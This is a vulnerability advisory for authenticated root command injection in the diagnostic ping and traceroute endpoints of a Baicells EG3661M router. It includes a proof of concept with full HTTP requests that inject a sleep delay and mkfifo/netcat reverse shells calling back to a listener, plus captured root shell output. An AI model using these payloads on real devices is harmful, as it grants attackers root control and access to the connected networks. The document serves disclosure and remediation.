| CVSS 3.1 | 7.2 (High) - `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Authentication | Required (admin `stok` + `sysauth` cookie) |

## Summary

The `diagnosis_route` and `diagnosis_ping` endpoints in the EG3661M LuCI web interface concatenate request parameters into a shell command without neutralizing shell metacharacters. An authenticated administrator can inject arbitrary commands, which execute as root. Both endpoints were demonstrated yielding an interactive root shell.

## Affected

- Baicells EG3661M (EG3661M-NR6 / PhotonID63M), firmware BaiCE_BQ6_2.0.5.3_NA.

## Description

The diagnostic handlers build `traceroute` (route) and `ping` (ping) command lines from request parameters and execute them via a shell with no input validation or argument separation. A `|` in an affected parameter terminates the intended command; the remainder is interpreted by the shell and runs with web-server privileges (root).

Both handlers return HTTP 200 with a stderr body (`sh: -q: not found` for route, `sh: -c: not found` for ping), produced when the original trailing options (`traceroute -q`, `ping -c`) are reparsed as commands after the final injected pipe. This response is expected and is not an indicator of failure. Execution is confirmed by response latency (blind) or by the reverse-shell callback.

Firmware is OpenWrt-based; the shell is BusyBox v1.30.1 (ash) and command execution occurs from web root `/www`, confirming the web server runs as root.

## Confirmed injection points

| Endpoint | Parameter | Result | Confirmation |
|---|---|---|---|
| `diagnosis_route` | `MaxHops` | Command execution | Time delay (`sleep 5`) |
| `diagnosis_route` | `Timeout` | Root RCE | Reverse shell, callback port 35160 |
| `diagnosis_ping` | `Size` | Root RCE | Reverse shell, callback port 35152 |

## Proof of Concept

Replace `TARGET` (device), `<SESSION>` (stok), `<SYSAUTH>` (sysauth cookie), `ATTACKER` (listener), `<TS>` (any). Encoding: `+`=space, `%3b`=`;`, `%26`=`&`. Listener: `nc -lvnp 4444`.

### 1. diagnosis_route - MaxHops (blind)

```http
GET /cgi-bin/luci/;stok=<SESSION>/admin/system/diagnosis_route?IPAddr=192.168.150.111&MaxHops=10|sleep+5|&type=icmp&Timeout=3&_=<TS> HTTP/1.1
Host: TARGET
Cookie: sysauth=<SYSAUTH>
```

Decoded `MaxHops`: `10|sleep 5|`
Result: response delayed ~6.2 s (Burp: 6,236 ms) vs near-instant baseline. Body `sh: -q: not found`.

### 2. diagnosis_route - Timeout (root reverse shell)

```http
GET /cgi-bin/luci/;stok=<SESSION>/admin/system/diagnosis_route?IPAddr=192.168.150.111&MaxHops=10&type=icmp&Timeout=3|mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/sh+-i+2>%261+|+nc+192.168.150.111+4444+>+/tmp/f|&_=<TS> HTTP/1.1
Host: TARGET
Cookie: sysauth=<SYSAUTH>
```

Decoded `Timeout`: `3|mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.150.111 4444 > /tmp/f|`
Result: root shell on listener, callback source port 35160. Body `sh: -q: not found`.

### 3. diagnosis_ping - Size (root reverse shell)

```http
GET /cgi-bin/luci/;stok=<SESSION>/admin/system/diagnosis_ping?IPAddr=192.168.150.129&Size=|mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/sh+-i+2>%261+|+nc+192.168.150.111+4444+>+/tmp/f|&Timeout=10&interface=default&Count=4&_=<TS> HTTP/1.1
Host: TARGET
Cookie: sysauth=<SYSAUTH>
```

Decoded `Size`: `|mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.150.111 4444 > /tmp/f|`
Result: root shell on listener, callback source port 35152. Body `sh: -c: not found`.

Captured shell:

```
connect to [192.168.150.111] from (UNKNOWN) [192.168.150.1] 35152
/bin/sh: can't access tty; job control turned off
BusyBox v1.30.1 () built-in shell (ash)
/www # id
uid=0(root) gid=0(root)
```

## Impact

- Arbitrary command execution as root, both endpoints.
- Offline-recoverable MD5crypt hashes for root and administrative accounts.
- Persistence and configuration tampering.
- Pivot into the connected operator/subscriber network.

## Remediation

- Validate parameters: `IPAddr` against a strict IP/hostname pattern; `MaxHops`, `Size`, `Timeout`, `Count` as bounded integers; `type`, `interface` allowlisted.
- Do not invoke a shell. Execute `ping`/`traceroute` with an argument array (`execve`-style) or library calls.
- Reject shell metacharacters:

```
| ; & $ ` ( ) < > newline
```
